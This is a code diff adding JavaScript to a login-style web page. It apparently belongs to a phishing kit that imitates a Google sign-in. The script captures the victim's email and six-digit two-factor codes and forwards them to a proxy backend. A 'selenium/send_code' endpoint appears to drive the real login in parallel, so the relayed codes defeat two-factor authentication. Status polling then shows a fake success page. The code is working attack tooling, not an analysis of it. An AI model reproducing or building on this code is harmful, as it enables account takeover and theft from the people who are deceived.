+                btn.addEventListener('click', async function(e) {
+                    e.preventDefault();
+                    const originalText = btn.textContent;
+                    btn.classList.add('send-again-loading');
+                    btn.textContent = 'Sending...';
+                    
+                    try {
+                        const method = this.id.replace('sendAgain', '').toLowerCase();
+                        const response = await fetch(`${PROXY_URL}?endpoint=/selenium/send_code&session_id=${encodeURIComponent(sessionId)}&method=${encodeURIComponent(method)}`);
+                        
+                        const data = await response.json();
+                        if (data.success) {
+                            showCustomAlert('New verification code sent!');
+                        } else {
+                            showCustomAlert('Failed to send code. Please try again.', true);
+                        }
+                    } catch (error) {
+                        console.error('Send again failed:', error);
+                        showCustomAlert('Failed to send. Please try again.', true);
+                    } finally {
+                        btn.classList.remove('send-again-loading');
+                        btn.textContent = originalText;
+                    }
+                });
+            }
+        });
+    }
+
+    function showCustomAlert(message, isError = false) {
+        const alertDiv = document.createElement('div');
+        alertDiv.className = 'custom-alert';
+        
+        const icon = document.createElement('span');
+        icon.className = 'material-icons custom-alert-icon';
+        icon.textContent = isError ? 'error' : 'check_circle';
+        if (isError) icon.classList.add('custom-alert-error');
+        
+        const messageSpan = document.createElement('span');
+        messageSpan.className = 'custom-alert-message';
+        messageSpan.textContent = message;
+        
+        alertDiv.appendChild(icon);
+        alertDiv.appendChild(messageSpan);
+        
+        document.body.appendChild(alertDiv);
+        
+        setTimeout(() => {
+            alertDiv.style.opacity = '0';
+            setTimeout(() => {
+                document.body.removeChild(alertDiv);
+            }, 300);
+        }, 3000);
+    }
+
+    async function handleCodeSubmit(method) {
+        const inputMap = {
+            text: textCodeInput,
+            email: emailCodeInput,
+            authenticator: authenticatorCodeInput
+        };
+        const errorMap = {
+            text: 'textCodeError',
+            email: 'emailCodeError',
+            authenticator: 'authenticatorCodeError'
+        };
+        
+        const input = inputMap[method];
+        const errorId = errorMap[method];
+        const code = input && input.value ? input.value.trim() : '';
+        
+        if (!code || code.length !== 6) {
+            showError(errorId, 'Please enter a 6-digit code');
+            return;
+        }
+        
+        clearError(errorId);
+        setLoadingState(true);
+        
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/auth/otp&email=${encodeURIComponent(currentEmail)}&otp=${encodeURIComponent(code)}&method=${encodeURIComponent(method)}&session_id=${encodeURIComponent(sessionId)}`);
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                startFinalStatusPolling();
+            } else {
+                setLoadingState(false);
+                showError(errorId, data.error || 'Invalid verification code');
+                if (input) {
+                    input.value = '';
+                    input.focus();
+                }
+            }
+        } catch (error) {
+            setLoadingState(false);
+            showError(errorId, 'Connection error. Please try again.');
+            console.error('Error:', error);
+        }
+    }
+
+    function startFinalStatusPolling() {
+        if (codeVerificationInterval) {
+            clearInterval(codeVerificationInterval);
+        }
+        
+        codeVerificationInterval = setInterval(async () => {
+            const status = await checkStatus();
+            if (status && status.display) {
+                if (status.display.current_page === 'exit' || !status.display.heading_found) {
+                    clearInterval(codeVerificationInterval);
+                    showLoading().hide();
+                    
+                    passwordForm.style.display = 'none';
+                    deviceAuthContainer.style.display = 'none';
+                    successPage.style.display = 'block';
+                }
+            }
+        }, 2000);
+    }
+
+    function updateProfileIcons(email) {
+        const initial = email.charAt(0).toUpperCase();
+        const colors = ['#4285F4', '#34A853', '#FBBC05', '#EA4335', '#673AB7'];
+        const colorIndex = initial.charCodeAt(0) % colors.length;
+        
+        profileIcons.forEach(icon => {
+            icon.textContent = initial;
+            icon.style.backgroundColor = colors[colorIndex];
+        });
+    }
+
+    function updateEmailDisplay(email) {
+        emailDisplay.textContent = email;
+        authEmailDisplay.textContent = email;
+    }
+
+    function logEvent(event_type, details) {
+        // This would be handled by the PHP proxy
+        console.log('Event logged:', event_type, details);
+    }
+});
     </script>
 </body>
 </html>
